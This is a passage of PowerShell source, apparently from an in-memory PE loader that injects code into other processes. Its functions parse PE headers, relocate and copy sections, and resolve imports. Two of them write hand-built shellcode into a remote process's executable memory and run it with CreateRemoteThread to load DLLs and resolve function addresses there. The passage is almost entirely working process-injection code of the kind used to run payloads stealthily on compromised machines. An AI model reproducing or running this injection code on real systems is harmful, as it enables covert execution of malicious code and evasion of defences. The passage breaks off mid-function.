        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        
        #Write FunctionName to memory (will be used in GetProcAddress)
        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        #todo: need to have detection for when to get by ordinal
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
